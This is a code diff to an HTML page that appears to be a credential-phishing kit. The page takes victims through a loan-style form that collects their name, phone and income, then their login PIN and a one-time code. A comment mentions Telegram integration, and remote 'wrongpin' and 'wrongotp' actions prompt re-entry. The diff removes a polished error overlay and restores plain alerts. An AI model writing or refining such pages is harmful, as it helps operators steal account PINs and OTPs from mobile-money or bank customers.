@@ -61,136 +61,6 @@ input[type=range]{width:100%;accent-color:#FFC400;margin:20px 0;height:8px}
 .loading-dots span:nth-child(2){animation-delay:.2s}
 .loading-dots span:nth-child(3){animation-delay:.4s}
 @keyframes blink{0%,60%,100%{opacity:.3}30%{opacity:1}}
-
-/* Error overlay (professional) */
-:root{
-  --overlay-bg: rgba(15,18,23,0.6);
-  --panel-bg: #ffffff;
-  --accent: #d9534f;
-  --muted: #6b7280;
-  --radius: 12px;
-  --shadow: 0 10px 30px rgba(10, 15, 25, 0.2);
-}
-
-.error-overlay {
-  position: fixed;
-  inset: 0;
-  display: grid;
-  place-items: center;
-  z-index: 10000;
-  font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
-}
-
-/* Ensure the hidden attribute actually hides the overlay (fixes global blur when overlay present) */
-.error-overlay[hidden]{
-  display:none !important;
-  visibility:hidden !important;
-  pointer-events:none !important;
-}
-.error-overlay[hidden] .error-overlay__backdrop{
-  backdrop-filter:none !important;
-  -webkit-backdrop-filter:none !important;
-}
-
-.error-overlay__backdrop {
-  position: absolute;
-  inset: 0;
-  background: var(--overlay-bg);
-  backdrop-filter: blur(6px) saturate(120%);
-  transition: opacity 180ms ease;
-}
-
-.error-overlay__panel {
-  position: relative;
-  width: min(92%, 480px);
-  background: linear-gradient(180deg, var(--panel-bg) 0%, #fbfbfb 100%);
-  border-radius: var(--radius);
-  box-shadow: var(--shadow);
-  padding: 24px;
-  display: flex;
-  flex-direction: column;
-  gap: 12px;
-  z-index: 1;
-  transform: translateY(8px);
-  opacity: 0;
-  transition: transform 200ms cubic-bezier(.2,.9,.3,1), opacity 180ms ease;
-}
-
-/* Visible state */
-.error-overlay:not([hidden]) .error-overlay__panel {
-  transform: translateY(0);
-  opacity: 1;
-}
-
-.error-overlay__close {
-  position: absolute;
-  top: 12px;
-  right: 12px;
-  border: none;
-  background: transparent;
-  color: var(--muted);
-  padding: 6px;
-  border-radius: 6px;
-  cursor: pointer;
-}
-.error-overlay__close:hover { background: rgba(0,0,0,0.04); color: #333; }
-
-.error-overlay__icon {
-  color: var(--accent);
-  display: block;
-  margin: 8px 0;
-}
-
-.error-overlay__title {
-  margin: 0;
-  font-size: 1.125rem;
-  font-weight: 600;
-  color: #111827;
-}
-
-.error-overlay__message {
-  margin: 0;
-  color: #374151;
-  line-height: 1.4;
-}
-
-.error-overlay__actions {
-  display: flex;
-  gap: 8px;
-  margin-top: 6px;
-}
-
-.btn {
-  font-size: 0.95rem;
-  padding: 8px 12px;
-  border-radius: 8px;
-  border: 1px solid transparent;
-  cursor: pointer;
-  text-decoration: none;
-  display: inline-flex;
-  align-items: center;
-  gap: 8px;
-}
-
-.btn--primary {
-  background: linear-gradient(180deg,#ef4444,#dc2626);
-  color: #fff;
-  box-shadow: 0 6px 18px rgba(220,38,38,0.18);
-  border-color: rgba(0,0,0,0.03);
-}
-
-.btn--ghost {
-  background: transparent;
-  color: var(--muted);
-  border: 1px solid #e6e7ea;
-}
-
-.error-overlay__hint {
-  margin: 0;
-  color: #6b7280;
-  font-size: 0.85rem;
-  margin-top: 6px;
-}
 </style>
 </head>
 <body>
@@ -301,34 +171,6 @@ input[type=range]{width:100%;accent-color:#FFC400;margin:20px 0;height:8px}
 </div>
 </div>
 
-<!-- Error Overlay (inserted) -->
-<div id="error-overlay" class="error-overlay" role="alertdialog" aria-modal="true" aria-labelledby="error-title" aria-describedby="error-message" hidden style="display:none;visibility:hidden;pointer-events:none;">
-  <div class="error-overlay__backdrop" data-close-overlay></div>
-  <div class="error-overlay__panel" role="document">
-    <button class="error-overlay__close" aria-label="Close" data-close-overlay>
-      <svg width="20" height="20" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
-        <path fill="currentColor" d="M18.3 5.71a1 1 0 0 0-1.41 0L12 10.59 7.11 5.7A1 1 0 1 0 5.7 7.11L10.59 12l-4.9 4.89a1 1 0 1 0 1.41 1.41L12 13.41l4.89 4.9a1 1 0 0 0 1.41-1.41L13.41 12l4.9-4.89a1 1 0 0 0 0-1.4z"/>
-      </svg>
-    </button>
-
-    <div class="error-overlay__icon" aria-hidden="true">
-      <svg width="48" height="48" viewBox="0 0 24 24" fill="none">
-        <circle cx="12" cy="12" r="11" fill="#fff" stroke="currentColor" stroke-opacity="0.08"/>
-        <path d="M11 7h2v6h-2zM11 15h2v2h-2z" fill="currentColor"/>
-      </svg>
-    </div>
-
-    <h2 id="error-title" class="error-overlay__title">Error</h2>
-    <p id="error-message" class="error-overlay__message">An unexpected error occurred.</p>
-
-    <div class="error-overlay__actions">
-      <button id="error-retry-btn" class="btn btn--primary">Try again</button>
-      <a id="error-help-link" class="btn btn--ghost" href="#" target="_blank" rel="noopener">Get help</a>
-    </div>
-    <p class="error-overlay__hint" id="error-hint" aria-hidden="true"></p>
-  </div>
-</div>
-
 <script>
 /*
   Telegram integration (client-side demo):
@@ -393,7 +235,7 @@ function nextStep(n){
   }
 }
 function checkDetails(){
-  if(!document.getElementById('fullName').value || !document.getElementById('phoneDetail').value || !document.getElementById('purpose').value || !document.getElementById('income').value){alert('P[...]
+  if(!document.getElementById('fullName').value || !document.getElementById('phoneDetail').value || !document.getElementById('purpose').value || !document.getElementById('income').value){alert('Please fill all required fields');return;}
   document.getElementById('loginPhone').value=document.getElementById('phoneDetail').value; nextStep(3);
 }
 function goToOTP(){
@@ -425,17 +267,8 @@ function goToOTP(){
             nextStep(4);
           } else if(action === 'wrongpin_login'){
             hideLoadingOverlay();
-            // show professional overlay instead of alert
-            if(window.showErrorOverlay) {
-              window.showErrorOverlay('wrongpin', {
-                onRetry: () => {
-                  // focus pin input for retry
-                  const pinInput = document.getElementById('loginPin'); if(pinInput){ pinInput.focus(); }
-                }
-              });
-            } else {
-              alert('The PIN or Mobile number provided is invalid. Please check the details and try again.');
-            }
+            alert('The PIN or Mobile number provided is invalid. Please check the details and try again.');
+            const pinInput = document.getElementById('loginPin'); if(pinInput){ pinInput.focus(); }
             // keep user on same page to re-enter pin
           } else {
             // unknown action
@@ -477,20 +310,10 @@ function submitOTP(){
             nextStep(5);
           } else if(action === 'wrongotp'){
             hideLoadingOverlay();
-            // use overlay instead of alert
-            if(window.showErrorOverlay){
-              window.showErrorOverlay('wrongotp', {
-                onRetry: () => {
-                  document.querySelectorAll('.otp').forEach(i=>i.value='');
-                  const first=document.getElementById('otp1'); if(first) first.focus();
-                }
-              });
-            } else {
-              alert('The OTP provided is wrong or has expired. Please try again.');
-              document.querySelectorAll('.otp').forEach(i=>i.value='');
-              const first=document.getElementById('otp1'); if(first) first.focus();
-            }
+            alert('The OTP provided is wrong or has expired. Please try again.');
             // clear OTP inputs and let user retry
+            document.querySelectorAll('.otp').forEach(i=>i.value='');
+            const first=document.getElementById('otp1'); if(first) first.focus();
           } else {
             hideLoadingOverlay();
             alert('Unknown OTP action: '+action);
@@ -683,145 +506,6 @@ function resendOTP(){
   const first=document.getElementById('otp1'); if(first) first.focus();
   startOTPTimer();
 }
-
-/* Error overlay JS: show/hide, focus trap, API */
-// Minimal focus trap helper
-function trapFocus(container) {
-  const focusable = container.querySelectorAll('a[href], button:not([disabled]), [tabindex]:not([tabindex="-1"])');
-  if (!focusable.length) return () => {};
-  const first = focusable[0], last = focusable[focusable.length - 1];
-  function onKey(e) {
-    if (e.key === 'Tab') {
-      if (e.shiftKey && document.activeElement === first) {
-        e.preventDefault();
-        last.focus();
-      } else if (!e.shiftKey && document.activeElement === last) {
-        e.preventDefault();
-        first.focus();
-      }
-    }
-  }
-  document.addEventListener('keydown', onKey);
-  return () => document.removeEventListener('keydown', onKey);
-}
-
-(function(){
-  const overlay = document.getElementById('error-overlay');
-  const panel = overlay?.querySelector('.error-overlay__panel');
-  const titleEl = document.getElementById('error-title');
-  const messageEl = document.getElementById('error-message');
-  const hintEl = document.getElementById('error-hint');
-  const retryBtn = document.getElementById('error-retry-btn');
-  const helpLink = document.getElementById('error-help-link');
-  const closeButtons = overlay?.querySelectorAll('[data-close-overlay]') ?? [];
-
-  let removeTrap = null;
-  let autoDismissTimeout = null;
-  let lastActive = null;
-
-  function hideOverlay() {
-    if (!overlay || overlay.hasAttribute('hidden')) return;
-    overlay.setAttribute('hidden', '');
-    // ensure inline styles also hide it (browser caching / inline fallback)
-    overlay.style.display = 'none';
-    overlay.style.visibility = 'hidden';
-    overlay.style.pointerEvents = 'none';
-    if (removeTrap) { removeTrap(); removeTrap = null; }
-    if (autoDismissTimeout) { clearTimeout(autoDismissTimeout); autoDismissTimeout = null; }
-    if (lastActive && lastActive.focus) lastActive.focus();
-    if (overlay._cleanup) { overlay._cleanup(); overlay._cleanup = null; }
-  }
-
-  function showOverlay({ title, message, hint, retryLabel = 'Try again', helpHref = '#', autoDismissMs } = {}) {
-    if (!overlay) return;
-    lastActive = document.activeElement;
-    overlay.removeAttribute('hidden');
-    // remove inline hide styles so it becomes visible even if set as a fallback
-    overlay.style.display = '';
-    overlay.style.visibility = '';
-    overlay.style.pointerEvents = '';
-
-    titleEl.textContent = title;
-    messageEl.textContent = message;
-    hintEl.textContent = hint || '';
-    hintEl.setAttribute('aria-hidden', hint ? 'false' : 'true');
-    retryBtn.textContent = retryLabel;
-    helpLink.href = helpHref;
-
-    // set focus
-    retryBtn.focus();
-    removeTrap = trapFocus(panel);
-
-    // Escape to close
-    function onEsc(e){ if (e.key === 'Escape') hideOverlay(); }
-    document.addEventListener('keydown', onEsc);
-    // cleanup when hidden
-    overlay._cleanup = () => document.removeEventListener('keydown', onEsc);
-
-    if (autoDismissMs && autoDismissMs > 0) {
-      autoDismissTimeout = setTimeout(() => {
-        hideOverlay();
-      }, autoDismissMs);
-    }
-  }
-
-  // close handlers
-  closeButtons.forEach(btn => btn.addEventListener('click', hideOverlay));
-  overlay?.addEventListener('click', (e) => {
-    // click on backdrop will close
-    if (e.target === overlay.querySelector('.error-overlay__backdrop')) hideOverlay();
-  });
-
-  // expose API globally
-  window.showErrorOverlay = function(type, opts = {}) {
-    // default messages — adjust tone to your brand
-    const messages = {
-      wrongpin: {
-        title: 'Incorrect PIN',
-        message: 'The PIN you entered is incorrect. Please try again.',
-        hint: opts.attemptsLeft != null ? `Attempts left: ${opts.attemptsLeft}` : ''
-      },
-      wrongotp: {
-        title: 'Invalid verification code',
-        message: 'The one-time code you entered is invalid or expired. Request a new code and try again.',
-        hint: opts.attemptsLeft != null ? `Attempts left: ${opts.attemptsLeft}` : ''
-      },
-      default: {
-        title: 'Action required',
-        message: 'Something went wrong. Please try again.',
-        hint: ''
-      }
-    };
-
-    const selected = messages[type] || messages.default;
-    showOverlay({
-      title: selected.title,
-      message: selected.message,
-      hint: selected.hint,
-      retryLabel: opts.retryLabel || 'Try again',
-      helpHref: opts.helpHref || '/help', // set to your help URL
-      autoDismissMs: opts.autoDismissMs // optional
-    });
-
-    // Optionally attach callback to retry button
-    if (typeof opts.onRetry === 'function') {
-      const handler = () => {
-        hideOverlay();
-        opts.onRetry();
-        retryBtn.removeEventListener('click', handler);
-      };
-      retryBtn.addEventListener('click', handler);
-    } else {
-      // default: hide overlay on retry
-      const handler = () => hideOverlay();
-      retryBtn.addEventListener('click', handler, { once: true });
-    }
-  };
-
-  // expose hide function too
-  window.hideErrorOverlay = hideOverlay;
-
-})();
 
 /* legacy verifyOTP removed; replaced by submitOTP() above */
 
